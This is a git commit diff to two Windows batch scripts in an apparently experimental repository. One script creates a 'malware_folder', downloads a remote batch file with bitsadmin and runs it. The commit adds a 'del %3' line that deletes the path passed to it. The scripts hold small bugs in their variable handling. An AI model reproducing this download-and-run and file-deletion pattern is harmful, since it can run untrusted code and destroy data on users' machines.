f30b58d134fa9c94b2bd164a192cd37696b32575
duydang2002 <76654292+duydang2002@users.noreply.github.com>
2024-12-25 09:33:16 +0700

    update script

--- Test2.bat
+++ Test2.bat
@@ -2,3 +2,4 @@
 echo this is first block %1
 echo this is second block %2
 echo this is third block %3
+del %3
--- test.bat
+++ test.bat
@@ -6,5 +6,5 @@ set path = C:\Users\Public\malware_folder
 mkdir path
 bitsadmin /transfer download https://raw.githubusercontent.com/duydang2002/TestScript/refs/heads/main/test.bat2 path
 echo Malware Dowloaded.
-call path Code1, Code2, Code3
+call path Code1, Code2, path
 pause
